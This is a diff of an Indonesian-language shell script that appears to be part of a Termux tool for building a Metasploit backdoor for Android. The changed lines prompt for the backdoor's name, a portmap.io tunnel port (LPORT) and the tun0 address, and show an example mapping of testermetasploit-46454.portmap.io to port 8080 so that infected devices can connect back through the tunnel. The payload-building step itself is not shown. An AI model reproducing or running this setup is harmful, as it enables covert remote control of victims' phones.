@@ -129,7 +129,7 @@ echo
 sleep 5
 clear
 read -p "[+] enter untuk membuat akun portmap.io" y
-xdg-open https://portmap.io/uuuu
+xdg-open https://portmap.io/
 read -p "[+] tekan enter untuk install openvpn" y
 xdg-open https://play.google.com/store/apps/details?id=net.openvpn.openvpn
 read -p "[+] tekan enter untuk install apksigner" y
@@ -156,12 +156,12 @@ read -p "MASUKAN NAMA BACKDOOR :" nama
 sleep 0.01
 echo $ungu "_________________________________________________________"
 echo
-echo $cyngga "Masukan LPORT Kalian"
+echo $cyngga "Masukan 5 digit angka portmap Kalian"
 echo
 echo $putih "testermetasploit-$hijau 46454$putih .portmap.io"
-echo $cyngga "Contoh LPORT saya (5 digit angka yg warna hijau)"
+echo $cyngga "Contoh 5 digit angka saya (yg warna hijau)"
 echo
-read -p "Masukan LPORT kalian : " lp
+read -p "Masukan 5 digit angka kalian : " lp
 echo                                                                                    
 echo $ungu "________________________________________________________"
 echo
@@ -189,7 +189,7 @@ echo
 baner
 echo
 echo $cyngga "HIDUPKAN OPEN VPN TERLEBIH DAHULU..."
-xdg-open https://play.google.com/store/apps/details?id=net.openvpn.openvpn
+am start --user 0 -n com.android.openvpn
 ifconfig
 echo                                                                            
 read -p "Masukan Iptun0 nya : " tun0
@@ -199,7 +199,7 @@ clear
 echo                                                                                    
 echo $kuning "---------------------------------------------------"
 echo
-echo $putih "testermetasploit-$hijau 46454$putih .portmap.io"
+echo $putih "testermetasploit-46454.portmap.io =>$hijau 8080"
 echo $cyngga "Contoh LPORT saya (5 digit angka yg warna hijau)"
 echo
 read -p "Masukan LPORT kalian : " lport;
